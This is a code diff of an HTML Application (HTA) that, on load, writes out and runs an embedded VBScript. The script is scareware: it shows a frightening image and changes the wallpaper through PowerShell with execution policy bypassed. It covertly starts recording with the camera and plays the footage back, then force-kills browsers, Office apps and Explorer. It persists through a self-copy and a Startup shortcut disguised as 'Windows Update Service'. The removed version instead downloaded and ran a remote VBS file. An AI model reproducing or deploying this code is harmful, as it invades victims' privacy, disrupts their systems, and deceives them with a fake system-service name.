@@ -1,35 +1,150 @@
 <html>
 <head>
-    <title>Download and Run VBS</title>
-    <hta:application id="app" />
-    <script language="VBScript">
-    Sub Window_OnLoad
-        vbsUrl = "https://skibiditoile3qb2.github.io/education/yo.vbs"
-        tempFolder = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) ' Temporary folder
-        vbsPath = tempFolder & "\yo.vbs"
+<title>Run Embedded VBS from HTA</title>
+<hta:application id="app"/>
+<script language="VBScript">
+Sub Window_OnLoad
+    Dim vbsCode, f, vbsFile
+    vbsFile = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\my_script.vbs"
 
-        Set x = CreateObject("MSXML2.XMLHTTP")
-        x.Open "GET", vbsUrl, False
-        x.Send
+    ' --- BEGIN: Your VBScript as a string ---
+    vbsCode = ""
+    vbsCode = vbsCode & "On Error Resume Next" & vbCrLf
+    vbsCode = vbsCode & "Dim oShell, oFSO, scriptPath, scaryImgUrl, scaryImgPath, psPath, bgUrl, bgPath" & vbCrLf
+    vbsCode = vbsCode & "Set oShell = CreateObject(""WScript.Shell"")" & vbCrLf
+    vbsCode = vbsCode & "Set oFSO = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf
+    vbsCode = vbsCode & "' ========== 1. SHOW SCARY IMAGE ==========" & vbCrLf
+    vbsCode = vbsCode & "scaryImgUrl = ""https://wallpapers.com/images/hd/scary-face-pictures-wtvdzqnwvit6n0te.jpg""" & vbCrLf
+    vbsCode = vbsCode & "scaryImgPath = oShell.ExpandEnvironmentStrings(""%TEMP%"") & ""\scary-face.jpg""" & vbCrLf
+    vbsCode = vbsCode & "DownloadToFile scaryImgUrl, scaryImgPath" & vbCrLf
+    vbsCode = vbsCode & "If oFSO.FileExists(scaryImgPath) Then" & vbCrLf
+    vbsCode = vbsCode & "    oShell.Run ""mspaint.exe '"" & scaryImgPath & ""'"", 1, False" & vbCrLf
+    vbsCode = vbsCode & "    WScript.Sleep 1800" & vbCrLf
+    vbsCode = vbsCode & "End If" & vbCrLf
+    vbsCode = vbsCode & "' ========== 2. CREEPY MSGBOX ==========" & vbCrLf
+    vbsCode = vbsCode & "MsgBox ""I'm watching you"", 16, ""...""" & vbCrLf
+    vbsCode = vbsCode & "' ========== 3. CHANGING BACKGROUND ==========" & vbCrLf
+    vbsCode = vbsCode & "bgUrl = ""https://wallpaperaccess.com/full/2332759.jpg""" & vbCrLf
+    vbsCode = vbsCode & "bgPath = oShell.ExpandEnvironmentStrings(""%USERPROFILE%"") & ""\Pictures\wallpaper.jpg""" & vbCrLf
+    vbsCode = vbsCode & "psPath = oShell.ExpandEnvironmentStrings(""%TEMP%"") & ""\setwp.ps1""" & vbCrLf
+    vbsCode = vbsCode & "If oFSO.FileExists(bgPath) Then oFSO.DeleteFile bgPath" & vbCrLf
+    vbsCode = vbsCode & "DownloadToFile bgUrl, bgPath" & vbCrLf
+    vbsCode = vbsCode & "If oFSO.FileExists(bgPath) Then" & vbCrLf
+    vbsCode = vbsCode & "    Dim oTxt" & vbCrLf
+    vbsCode = vbsCode & "    Set oTxt = oFSO.CreateTextFile(psPath, True)" & vbCrLf
+    vbsCode = vbsCode & "    oTxt.WriteLine ""$path = '"" & bgPath & ""'""" & vbCrLf
+    vbsCode = vbsCode & "    oTxt.WriteLine ""Add-Type -TypeDefinition @'""" & vbCrLf
+    vbsCode = vbsCode & "    oTxt.WriteLine ""using System;""" & vbCrLf
+    vbsCode = vbsCode & "    oTxt.WriteLine ""using System.Runtime.InteropServices;""" & vbCrLf
+    vbsCode = vbsCode & "    oTxt.WriteLine ""public class Wallpaper {""" & vbCrLf
+    vbsCode = vbsCode & "    oTxt.WriteLine ""    [DllImport('user32.dll')]""" & vbCrLf
+    vbsCode = vbsCode & "    oTxt.WriteLine ""    public static extern int SystemParametersInfo(int a, int b, string c, int d);""" & vbCrLf
+    vbsCode = vbsCode & "    oTxt.WriteLine ""}""" & vbCrLf
+    vbsCode = vbsCode & "    oTxt.WriteLine ""'@""" & vbCrLf
+    vbsCode = vbsCode & "    oTxt.WriteLine ""[Wallpaper]::SystemParametersInfo(20, 0, $path, 3)""" & vbCrLf
+    vbsCode = vbsCode & "    oTxt.Close" & vbCrLf
+    vbsCode = vbsCode & "    Dim i" & vbCrLf
+    vbsCode = vbsCode & "    For i = 1 To 10" & vbCrLf
+    vbsCode = vbsCode & "        WScript.Sleep 500" & vbCrLf
+    vbsCode = vbsCode & "        If oFSO.FileExists(bgPath) Then" & vbCrLf
+    vbsCode = vbsCode & "            If oFSO.GetFile(bgPath).Size > 0 Then Exit For" & vbCrLf
+    vbsCode = vbsCode & "        End If" & vbCrLf
+    vbsCode = vbsCode & "    Next" & vbCrLf
+    vbsCode = vbsCode & "    oShell.Run ""powershell -ExecutionPolicy Bypass -File '"" & psPath & ""'"", 0, True" & vbCrLf
+    vbsCode = vbsCode & "End If" & vbCrLf
+    vbsCode = vbsCode & "WScript.Sleep 1000" & vbCrLf
+    vbsCode = vbsCode & "' ========== 4. CAMERA: open, record, play result ==========" & vbCrLf
+    vbsCode = vbsCode & "oShell.Run ""explorer.exe microsoft.windows.camera:"""", 1, False" & vbCrLf
+    vbsCode = vbsCode & "WScript.Sleep 2500" & vbCrLf
+    vbsCode = vbsCode & "oShell.AppActivate ""Camera""" & vbCrLf
+    vbsCode = vbsCode & "WScript.Sleep 800" & vbCrLf
+    vbsCode = vbsCode & "oShell.SendKeys "" """ & vbCrLf
+    vbsCode = vbsCode & "WScript.Sleep 5000" & vbCrLf
+    vbsCode = vbsCode & "oShell.SendKeys "" """ & vbCrLf
+    vbsCode = vbsCode & "WScript.Sleep 2000" & vbCrLf
+    vbsCode = vbsCode & "' ========== 5. Find and open newest video ==========" & vbCrLf
+    vbsCode = vbsCode & "Dim photoPath, folder, file, newestFile, newestDate" & vbCrLf
+    vbsCode = vbsCode & "photoPath = oShell.ExpandEnvironmentStrings(""%USERPROFILE%"") & ""\Pictures\Camera Roll""" & vbCrLf
+    vbsCode = vbsCode & "newestDate = #1/1/1900#" & vbCrLf
+    vbsCode = vbsCode & "newestFile = """"" & vbCrLf
+    vbsCode = vbsCode & "If oFSO.FolderExists(photoPath) Then" & vbCrLf
+    vbsCode = vbsCode & "    Set folder = oFSO.GetFolder(photoPath)" & vbCrLf
+    vbsCode = vbsCode & "    For Each file In folder.Files" & vbCrLf
+    vbsCode = vbsCode & "        If LCase(oFSO.GetExtensionName(file.Path)) = ""mp4"" Then" & vbCrLf
+    vbsCode = vbsCode & "            If file.DateLastModified > newestDate Then" & vbCrLf
+    vbsCode = vbsCode & "                newestDate = file.DateLastModified" & vbCrLf
+    vbsCode = vbsCode & "                newestFile = file.Path" & vbCrLf
+    vbsCode = vbsCode & "            End If" & vbCrLf
+    vbsCode = vbsCode & "        End If" & vbCrLf
+    vbsCode = vbsCode & "    Next" & vbCrLf
+    vbsCode = vbsCode & "    If newestFile <> """" Then" & vbCrLf
+    vbsCode = vbsCode & "        oShell.Run """" & newestFile & """""" & vbCrLf
+    vbsCode = vbsCode & "    End If" & vbCrLf
+    vbsCode = vbsCode & "End If" & vbCrLf
+    vbsCode = vbsCode & "WScript.Sleep 5000" & vbCrLf
+    vbsCode = vbsCode & "' ========== 6. 'You look beautiful' ==========" & vbCrLf
+    vbsCode = vbsCode & "MsgBox ""you look. . . beautiful."", 64, ""...""" & vbCrLf
+    vbsCode = vbsCode & "' ========== 7. Minimize and close all user apps, including explorer, camera, video apps ==========" & vbCrLf
+    vbsCode = vbsCode & "WScript.Sleep 2000" & vbCrLf
+    vbsCode = vbsCode & "oShell.SendKeys ""^{ESC}"": WScript.Sleep 200" & vbCrLf
+    vbsCode = vbsCode & "oShell.SendKeys ""^{ESC}"": WScript.Sleep 500" & vbCrLf
+    vbsCode = vbsCode & "Dim appList, appName" & vbCrLf
+    vbsCode = vbsCode & "appList = Array(""notepad.exe"", ""mspaint.exe"", ""calc.exe"", ""Microsoft.Photos.exe"", ""camera.exe"", ""SystemSettings.exe"", ""winword.exe"", ""excel.exe"", ""powerpnt.exe"", ""chrome.exe"", ""firefox.exe"", ""msedge.exe"", ""wmplayer.exe"", ""explorer.exe"", ""WindowsCamera.exe"", ""Video.UI.exe"", ""VideoPlayer.exe"", ""MovieMaker.exe"", ""Groove.exe"")" & vbCrLf
+    vbsCode = vbsCode & "For Each appName In appList" & vbCrLf
+    vbsCode = vbsCode & "    oShell.Run ""powershell -WindowStyle hidden -Command """"Get-Process "" & Replace(appName, "".exe"", """") & "" -ErrorAction SilentlyContinue | Stop-Process -Force"""", 0, True" & vbCrLf
+    vbsCode = vbsCode & "Next" & vbCrLf
+    vbsCode = vbsCode & "WScript.Sleep 900" & vbCrLf
+    vbsCode = vbsCode & "' ========== 8. Final scary message ==========" & vbCrLf
+    vbsCode = vbsCode & "MsgBox ""YoU dId ThIs"", 16, ""The End""" & vbCrLf
+    vbsCode = vbsCode & "' ========== 9. Self-copy & Startup shortcut ==========" & vbCrLf
+    vbsCode = vbsCode & "scriptPath = WScript.ScriptFullName" & vbCrLf
+    vbsCode = vbsCode & "Dim copyTo, shortcutPath, ws, startupFldr" & vbCrLf
+    vbsCode = vbsCode & "copyTo = oShell.ExpandEnvironmentStrings(""%APPDATA%"") & ""\winupdate.vbs""" & vbCrLf
+    vbsCode = vbsCode & "oFSO.CopyFile scriptPath, copyTo, True" & vbCrLf
+    vbsCode = vbsCode & "Set ws = CreateObject(""WScript.Shell"")" & vbCrLf
+    vbsCode = vbsCode & "startupFldr = ws.SpecialFolders(""Startup"")" & vbCrLf
+    vbsCode = vbsCode & "shortcutPath = startupFldr & ""\winupdate.lnk""" & vbCrLf
+    vbsCode = vbsCode & "If oFSO.FileExists(shortcutPath) Then oFSO.DeleteFile shortcutPath" & vbCrLf
+    vbsCode = vbsCode & "Dim shortcut" & vbCrLf
+    vbsCode = vbsCode & "Set shortcut = ws.CreateShortcut(shortcutPath)" & vbCrLf
+    vbsCode = vbsCode & "shortcut.TargetPath = copyTo" & vbCrLf
+    vbsCode = vbsCode & "shortcut.WindowStyle = 1" & vbCrLf
+    vbsCode = vbsCode & "shortcut.Description = ""Windows Update Service""" & vbCrLf
+    vbsCode = vbsCode & "shortcut.Save" & vbCrLf
+    vbsCode = vbsCode & "' ========== 10. Play LOUD YouTube sound ==========" & vbCrLf
+    vbsCode = vbsCode & "oShell.Run ""https://www.youtube.com/watch?v=7iUiVa2tfFo"", 1, False" & vbCrLf
+    vbsCode = vbsCode & "' ======= DownloadToFile FUNCTION ==========" & vbCrLf
+    vbsCode = vbsCode & "Sub DownloadToFile(url, path)" & vbCrLf
+    vbsCode = vbsCode & "    On Error Resume Next" & vbCrLf
+    vbsCode = vbsCode & "    Dim x, s" & vbCrLf
+    vbsCode = vbsCode & "    Set x = CreateObject(""MSXML2.XMLHTTP"")" & vbCrLf
+    vbsCode = vbsCode & "    x.Open ""GET"", url, False" & vbCrLf
+    vbsCode = vbsCode & "    x.setRequestHeader ""User-Agent"", ""Mozilla/5.0""" & vbCrLf
+    vbsCode = vbsCode & "    x.Send" & vbCrLf
+    vbsCode = vbsCode & "    If x.Status = 200 Then" & vbCrLf
+    vbsCode = vbsCode & "        Set s = CreateObject(""ADODB.Stream"")" & vbCrLf
+    vbsCode = vbsCode & "        s.Type = 1" & vbCrLf
+    vbsCode = vbsCode & "        s.Open" & vbCrLf
+    vbsCode = vbsCode & "        s.Write x.ResponseBody" & vbCrLf
+    vbsCode = vbsCode & "        s.SaveToFile path, 2" & vbCrLf
+    vbsCode = vbsCode & "        s.Close" & vbCrLf
+    vbsCode = vbsCode & "    End If" & vbCrLf
+    vbsCode = vbsCode & "End Sub" & vbCrLf
+    ' --- END: Your VBScript as a string ---
 
-        If x.Status = 200 Then
-            Set s = CreateObject("ADODB.Stream")
-            s.Type = 2 ' text
-            s.Charset = "utf-8"
-            s.Open
-            s.WriteText x.ResponseText
-            s.SaveToFile vbsPath, 2
-            s.Close
+    ' Write to file
+    Set f = CreateObject("Scripting.FileSystemObject").CreateTextFile(vbsFile, True)
+    f.Write vbsCode
+    f.Close
 
-            CreateObject("WScript.Shell").Run "wscript.exe """ & vbsPath & """", 1, False
-            MsgBox "VBS file downloaded and executed."
-        Else
-            MsgBox "Download failed: " & x.Status
-        End If
-    End Sub
-    </script>
+    ' Run the VBS file
+    CreateObject("WScript.Shell").Run "wscript.exe """ & vbsFile & """", 1, False
+
+    MsgBox "Script created and launched: " & vbsFile
+End Sub
+</script>
 </head>
 <body>
-    <h2>Downloading and Running VBS...</h2>
+    <h2>HTA will create and run embedded VBScript</h2>
 </body>
 </html>
